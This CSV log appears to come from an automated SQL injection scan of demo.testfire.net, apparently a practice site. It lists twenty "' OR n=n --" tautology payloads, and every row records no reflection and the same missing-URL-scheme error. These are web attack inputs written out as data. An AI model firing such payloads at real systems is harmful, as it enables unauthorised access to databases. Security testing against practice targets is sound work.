payload,reflected,error
' OR 31=31 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 32=32 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 33=33 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 34=34 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 35=35 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 36=36 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 37=37 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 38=38 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 39=39 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 40=40 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 41=41 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 42=42 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 43=43 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 44=44 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 45=45 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 46=46 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 47=47 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 48=48 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 49=49 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
' OR 50=50 --,False,Invalid URL 'demo.testfire.net': No scheme supplied. Perhaps you meant https://demo.testfire.net?
